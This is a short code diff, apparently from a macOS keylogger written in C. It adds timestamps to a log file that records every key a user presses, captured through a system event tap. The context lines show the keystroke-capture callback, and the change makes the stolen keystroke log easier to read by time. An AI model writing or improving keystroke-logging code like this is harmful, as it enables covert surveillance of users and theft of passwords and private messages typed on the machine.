@@ -2,6 +2,10 @@
 
 CGEventFlags lastFlags = 0;
 
+int tm_hour;
+int tm_min; 
+int tm_sec;
+
 int main(int argc, const char *argv[]) {
 
     // Create an event tap to retrieve keypresses.
@@ -100,6 +104,20 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
     // Only log key down events.
     if (!down) {
         return event;
+    }
+
+    time_t rawtime = time(NULL);
+    struct tm * timeinfo = localtime(&rawtime);
+
+    if (tm_hour != timeinfo->tm_hour 
+        || tm_min != timeinfo->tm_min 
+        || tm_sec != timeinfo->tm_sec
+    ) {
+        tm_hour = timeinfo->tm_hour; 
+        tm_min = timeinfo->tm_min; 
+        tm_sec = timeinfo->tm_sec;
+
+        fprintf(logfile, "\n%02d:%02d:%02d: ", tm_hour, tm_min, tm_sec);
     }
 
     // Print the human readable key to the logfile.
